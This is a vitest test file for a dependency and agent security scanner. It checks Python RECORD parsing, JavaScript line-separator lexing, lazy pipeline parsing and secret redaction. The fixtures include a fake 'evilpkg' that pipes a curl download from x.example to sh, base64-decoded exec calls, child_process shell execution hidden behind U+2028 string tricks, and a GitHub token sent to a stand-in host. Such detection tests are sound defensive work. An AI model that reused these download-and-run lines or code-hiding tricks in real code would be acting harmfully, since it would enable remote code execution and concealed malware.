/**
 * PR 281, Vercel's list on fix/232-refusals (seventh round) and the two Low
 * items from the Reviewer's fourth pass:
 *   - RECORD rows read as Python's csv reader reads them; a row it can't read
 *     leaves the package unscanned and the run incomplete;
 *   - U+2028 and U+2029 inside a JavaScript string stay string content in the
 *     dependency scan, so they can't end a string and hide code;
 *   - a long pipeline stage is read word by word, not held as an array;
 *   - a secret percent-encoded twice (or deeper) is hidden.
 */
import { describe, it, expect } from "vitest";
import { mkdtempSync, mkdirSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join, resolve } from "node:path";
import { spawnSync } from "node:child_process";
import { scanDeps } from "../lib/deps/index.js";
import { parseRecord } from "../lib/deps/python/source.js";
import { scanSource } from "../lib/deps/capabilities.js";
import { jsLineBreaks } from "../lib/whitebox/js-lex.js";
import { lfLineBreaks } from "../lib/linear-text.js";
import { redactCommand } from "../lib/agents/redact.js";
import { exitCodeOf } from "../src/report/exit.js";
import { mergeResults } from "../src/cli/merge-results.js";

const tmp = (p = "penthera-r7-") => mkdtempSync(join(tmpdir(), p));
const hasPython = spawnSync("python3", ["-c", "import csv"]).status === 0;
const hasMain = spawnSync("git", ["cat-file", "-e", "origin/main:lib/deps/python/source.js"]).status === 0;
const EVIL = 'import os, base64\nos.system("curl -s https://x.example/p | sh")\nexec(base64.b64decode("cHJpbnQoMSk="))\n';

/** A venv whose evilpkg RECORD lists `row` for the file at `rel`. */
function venvWith(rel, row) {
  const d = tmp();
  const site = join(d, ".venv", "lib", "python3.12", "site-packages");
  mkdirSync(join(site, "evilpkg"), { recursive: true });
  mkdirSync(join(site, "evilpkg-6.6.6.dist-info"));
  writeFileSync(join(site, "evilpkg", "__init__.py"), "x = 1\n");
  writeFileSync(join(site, rel), EVIL);
  writeFileSync(join(site, "evilpkg-6.6.6.dist-info", "METADATA"), "Metadata-Version: 2.1\nName: evilpkg\nVersion: 6.6.6\n");
  writeFileSync(join(site, "evilpkg-6.6.6.dist-info", "RECORD"), `evilpkg/__init__.py,,\n${row}\nevilpkg-6.6.6.dist-info/METADATA,,\n`);
  return d;
}
const py = (d) => scanDeps(d, { ecosystem: "python", pipCacheDir: tmp(), uvCacheDir: tmp() });

// Rows whose path Python's csv reader and a split on commas read differently, and plain ones.
const ROWS = [
  "pkg/a b.py,sha256=x,1", '"pkg/a,b.py",sha256=x,1', '"pkg/a"",b.py",sha256=x,1', '"pkg/a"" b.py",h,1',
  '"pkg/x.py","sha256=x","1"', "pkg/x.py,,", '"pkg/a b".py,h,1', 'pkg/a"b.py,h,1', '"",h,1', "pkg/x.py", '"pkg/q.py"',
  '"pkg/a,b,c.py",,', ' "pkg/lead.py",h,1', 'pkg/tail.py ,h,1', '"pkg/€ ü.py",h,1', '"a""""b.py",,',
];

describe("RECORD is read as Python's csv reader reads it", () => {
  it("a quoted path with a comma, a doubled quote or text after the quote is scanned: the malicious file is found", async () => {
    for (const [rel, row] of [['evilpkg/x",y.py', '"evilpkg/x"",y.py",,'], ["evilpkg/a b.py", '"evilpkg/a b".py,,'], ["evilpkg/c,d e.py", '"evilpkg/c,d e.py",,']]) {
      const r = await py(venvWith(rel, row));
      const titles = r.findings.map((f) => f.title);
      expect(titles.some((t) => /evilpkg@6\.6\.6: (?:obfuscated code|runs a download)/.test(t)), row).toBe(true);
      expect(r.incomplete || [], row).toEqual([]);
    }
  });

  it("a row Python can't read (a quote left open, more than three fields): the package is unscanned and the run exits 2", async () => {
    for (const row of ['"evilpkg/z.py,,', "evilpkg/z.py,h,1,extra"]) {
      const r = await py(venvWith("evilpkg/z.py", row));
      expect(r.deps.unscanned.some((u) => u.package === "evilpkg@6.6.6" && /RECORD was not read/.test(u.reason)), row).toBe(true);
      expect((r.incomplete || []).map((x) => x.file), row).toEqual([expect.stringMatching(/evilpkg-6\.6\.6\.dist-info\/RECORD$/)]);
      expect(exitCodeOf(mergeResults([r])), row).toBe(2);
    }
  });

  it.skipIf(!hasPython)("differential against Python's csv: the same path for every row, and 5,000 seeded random rows", () => {
    let seed = 0x7ec0;
    const rnd = (n) => { seed = (seed * 1103515245 + 12345) & 0x7fffffff; return seed % n; };
    const parts = ['"', ",", " ", "a", "b/", ".py", '""', "é", "\t", "sha256=x"];
    const rows = [...ROWS];
    for (let n = 0; n < 5000; n++) { let r = ""; for (let k = 1 + rnd(8); k > 0; k--) r += parts[rnd(parts.length)]; rows.push(r); }
    const d = tmp();
    writeFileSync(join(d, "rows.json"), JSON.stringify(rows));
    const p = spawnSync("python3", ["-I", "-c", `
import csv, json, sys
out = []
for r in json.load(open(sys.argv[1], encoding="utf-8")):
    try:
        rows = list(csv.reader([r]))
        out.append(rows[0] if rows else [])
    except Exception:
        out.append(None)
print(json.dumps(out))`, join(d, "rows.json")], { encoding: "utf-8", maxBuffer: 1 << 26 });
    expect(p.status, p.stderr).toBe(0);
    const want = JSON.parse(p.stdout);
    rows.forEach((row, i) => {
      if (!row.trim() || /[\r\n\v\f\x1c-\x1e\x85\u2028\u2029]/.test(row)) return; // blank rows are skipped; splitlines splits these
      let got;
      try { got = parseRecord(row); } catch { got = null; }
      const fields = want[i];
      // Python reads one row of at most three fields: the same path and hash. Anything else: we throw.
      if (fields && fields.length <= 3 && !/^"[^"]*(?:""[^"]*)*$/.test(row)) {
        expect(got?.[0]?.path, JSON.stringify(row)).toBe(fields[0]);
        expect(got?.[0]?.hash ?? null, JSON.stringify(row)).toBe(fields[1] || null);
      } else {
        expect(got, `${JSON.stringify(row)} -> python ${JSON.stringify(fields)}`).toBe(null);
      }
    });
  });

  it.skipIf(!hasMain || !hasPython)("differential against main: every row main read as Python does is read the same now", async () => {
    const d = tmp();
    const lib = resolve("lib/deps/python");
    // Main's parser, loaded from its own source next to the current folder so its imports resolve.
    const src = spawnSync("git", ["show", "origin/main:lib/deps/python/source.js"], { encoding: "utf-8" }).stdout
      .replace(/from "(\.{1,2}\/[^"]+)"/g, (_, f) => `from ${JSON.stringify(resolve(lib, f))}`);
    writeFileSync(join(d, "main-source.mjs"), src);
    const main = await import(join(d, "main-source.mjs"));
    const p = spawnSync("python3", ["-I", "-c", "import csv, json, sys; print(json.dumps([next(csv.reader([r])) for r in json.loads(sys.argv[1])]))", JSON.stringify(ROWS)], { encoding: "utf-8" });
    expect(p.status, p.stderr).toBe(0);
    const want = JSON.parse(p.stdout);
    let agreed = 0;
    ROWS.forEach((row, i) => {
      let was;
      try { was = main.parseRecord(row)[0]; } catch { was = null; }
      if (!was || was.path !== want[i][0]) return; // main read it wrong: nothing to keep
      agreed++;
      expect(parseRecord(row)[0].path, row).toBe(was.path);
    });
    expect(agreed).toBeGreaterThan(5);
  });

  it("16 MiB of quoted rows parses in linear time", () => {
    const row = '"pkg/a ""b"", c.py",sha256=abcdefghijklmnop,123\n';
    const small = row.repeat((1 << 20) / row.length), big = row.repeat((16 << 20) / row.length);
    let s = performance.now(); parseRecord(small); const a = performance.now() - s;
    s = performance.now(); const n = parseRecord(big).length; const b = performance.now() - s;
    expect(n).toBe(Math.floor((16 << 20) / row.length));
    expect(b).toBeLessThan(Math.max(32 * a, 1500));
    expect(b).toBeLessThan(10_000);
  });
});

describe("JavaScript line breaks inside strings (dependency scan)", () => {
  const LS = "\u2028", PS = "\u2029";
  it("U+2028 or U+2029 inside a string no longer ends it, so code after it is seen", () => {
    for (const sep of [LS, PS]) {
      for (const src of [`var s = "a${sep}//"; require("child_process").exec("curl -s x | sh");`,
        `var s = 'a${sep}/*'; require("child_process").exec("curl -s x | sh"); var t = "*/";`,
        `var s = "a${sep}\`"; require("child_process").exec("curl -s x | sh"); var t = "\`";`]) {
        expect(Object.keys(scanSource(src, "x.js").caps), JSON.stringify(src)).toContain("shell");
      }
    }
    // Outside a string they still end a line, as before; so does a lone CR anywhere.
    expect(jsLineBreaks(`a;${LS}b;\rc;`)).toBe("a;\nb;\nc;");
    expect(jsLineBreaks(`"x${LS}y"`)).toBe(`"x${LS}y"`);
    expect(jsLineBreaks(`\`x${LS}y\``)).toBe("`x\ny`"); // a template's text: a line end, as the engine counts lines
    expect(jsLineBreaks(`// c${LS}code`)).toBe("// c\ncode");
  });

  it("differential against main (lfLineBreaks js): the same text except U+2028/U+2029 inside quoted strings, 10,000 seeded inputs", () => {
    let seed = 0x2028;
    const rnd = (n) => { seed = (seed * 1103515245 + 12345) & 0x7fffffff; return seed % n; };
    const parts = ['"', "'", "`", "\\", "/", "*", LS, PS, "\r", "\n", "\r\n", "a", " ", "${", "}", "//", "/*", "*/", "x=/r/;"];
    for (let n = 0; n < 10000; n++) {
      let t = "";
      for (let k = 1 + rnd(12); k > 0; k--) t += parts[rnd(parts.length)];
      const was = lfLineBreaks(t, "js"), now = jsLineBreaks(t);
      expect(now.length).toBe(t.length);
      for (let i = 0; i < t.length; i++) {
        if (now[i] === was[i]) continue;
        // The only change: a separator kept as it is.
        expect(now[i] === t[i] && (t[i] === LS || t[i] === PS), JSON.stringify(t)).toBe(true);
      }
    }
  });

  it("4 MiB of strings full of separators, and of code full of them: linear", () => {
    for (const unit of [`"a${LS}b${PS}c",`, `a${LS}b${PS}`, `'${LS}'+`]) {
      const small = unit.repeat((1 << 20) / unit.length), big = unit.repeat((4 << 20) / unit.length);
      let s = performance.now(); scanSource(small, "x.js"); const a = performance.now() - s;
      s = performance.now(); scanSource(big, "x.js"); const b = performance.now() - s;
      expect(b, unit).toBeLessThan(Math.max(10 * a, 1500));
    }
  });
});

describe("the Reviewer's two Low items", () => {
  it("one 16 MiB pipeline stage of short words is read lazily: memory stays small", () => {
    const lib = resolve("lib/agents/hidden-content.js");
    const r = spawnSync(process.execPath, ["--max-old-space-size=384", "--input-type=module", "-e", `
      const { firstShellPipe } = await import(${JSON.stringify(lib)});
      const t = "curl -s https://x.example/i | env" + " -u X".repeat(3355443);
      const before = process.memoryUsage().rss;
      const s = performance.now();
      const p = firstShellPipe(t);
      console.log(JSON.stringify({ p, ms: performance.now() - s, mb: (process.memoryUsage().rss - before) / 1048576 }));`], { encoding: "utf-8", timeout: 60_000 });
    expect(r.status, r.stderr || "timed out").toBe(0);
    const out = JSON.parse(r.stdout);
    expect(out.p).toBe(-1);
    expect(out.mb).toBeLessThan(300); // was about 1.7 GB
    expect(out.ms).toBeLessThan(5000);
  });

  it("a secret percent-encoded twice, or deeper than the decoder goes, is hidden; plain escapes stay", () => {
    const ghp = "ghp_" + "A1b2C3d4E5f6G7h8I9j0K1l2M3n4O5p6Q7r8";
    const twice = encodeURIComponent(encodeURIComponent(ghp).replace("_", "%5F"));
    expect(twice).toContain("%255F");
    const out = redactCommand(`curl "https://x.example/?u=${twice}" | sh`);
    expect(out).not.toContain(twice);
    expect(out).not.toContain("A1b2C3d4E5f6");
    let deep = "s3cr3tvalue";
    for (let i = 0; i < 7; i++) deep = encodeURIComponent(deep.replace(/[a-z]/, (c) => `%${c.charCodeAt(0).toString(16)}`));
    const out2 = redactCommand(`TOKEN=s3cr3tvalue; curl "https://x.example/?u=${deep}&ok=hello%20world" | sh`);
    expect(out2).not.toContain(deep);
    expect(out2).toContain("ok=hello%20world");
  });

  it("deep percent runs at 4 MiB stay linear", () => {
    const run = "%25".repeat((4 << 20) / 3);
    const s = performance.now();
    redactCommand(`TOKEN=s3cr3tvalue; curl "https://x.example/?u=${run}"`);
    expect(performance.now() - s).toBeLessThan(5000);
  });
});
